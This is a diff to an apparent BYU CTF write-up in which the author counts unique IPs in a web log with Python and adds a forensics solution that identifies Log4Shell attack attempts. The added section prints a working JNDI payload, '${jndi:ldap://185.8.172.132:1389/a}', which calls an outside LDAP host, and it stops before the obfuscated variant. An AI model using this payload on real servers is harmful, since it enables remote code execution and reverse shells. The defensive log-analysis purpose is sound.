@@ -57,7 +57,7 @@ with open(filename) as f:
 
     print(len(ips))
 ```
-As always, 10 lines of Python can fix all my problems. This script returned `98` to stdout, which was the correct flag. I'm still not sure why my bash commands didn't work, but this Python is prety straightforward to understand. I prefer the `with open (filename) as f:` syntax because it automatically closes the file after the indented section. `data.split("\n")` separates the file into an array using the newline character as a delimiter. I iterated through the list version of the log file and if the line had a character in it (i.e. it wasn't the last line in the file), I would split the line by whitespace, which is the default behavior for the `.split()` command. Taking index 0 of the resulting list returned the IP at the beginning of the command. I then added the IP to a set, because sets don't store duplicates, allowing me to just print the size of the set at the end to get the correct number of unique IP addresses that sent HTTP requests to the server.
+As always, 10 lines of Python can fix all my problems. This script returned `98` to stdout, which was the correct flag. I'm still not sure why my bash commands didn't work, but this Python is prety straightforward to understand. I prefer the `with open (filename) as f:` syntax because it automatically closes the file after the indented section. `data.split("\n")` separates the file into an array using the newline character as a delimiter. I iterated through the list version of the log file and if the line had a character in it (i.e. it wasn't the last line in the file), I would split the line by whitespace, which is the default behavior for the `.split()` command. Taking index 0 of the resulting list returned the IP at the beginning of the list. I then added the IP to a set, because sets don't store duplicates, allowing me to just print the size of the set at the end to get the correct number of unique IP addresses that sent HTTP requests to the server.
 
 #### Real World Application
 There are a couple of things to take from this challenge. Most worth noting is the idea that challenges can be solved multiple ways. It's absolutely possible to just have used Linux commands to find the flag. Since I'm not an expert in Linux, I was able to utilize my Python talents to accomplish the same goal. Using Python or Linux to parse files like this is a fairly common industry task. In this case, finding the number of IPs that sent HTTP requests to a webserver gives the blue team a list to search through to find attackers.
@@ -96,6 +96,18 @@ Flag format - byuctf{100.100.100.100_200.200.200.200}
 ```
 
 #### Solution
+Log4j is a Java logging framework. Log4Shell, the exploit of Log4j, works by allowing the user to specify custom code to format a log message. You can use this ability to submit code for the server's machine to execute. That code can be used to open a reverse shell. The exploit code to send the webserver typically reads
+```
+${jndi:ldap://185.8.172.132:1389/a}
+```
+
+Yet again, grep comes in handy. A simple `grep jndi acess.log` reutrns a single line:
+```
+98.0.242.10 - - [09/Feb/2022:14:30:51 +0000] "GET / HTTP/1.1" 200 820 "-" "${jndi:ldap://185.8.172.132:1389/a}"
+```
+
+Now we have the first IP that tried to exploit Log4Shell- `98.0.242.10`. Finding the second one was a bit harder. I looked through a few YouTube videos to try to figure out if there was another way to exploit it. I wasn't able to find any other way. Eventually, I realized that they must've found a way to obfuscate the exploit. A quick Google search turned up the obfuscated exploit code
+
 
 #### Real World Application
 
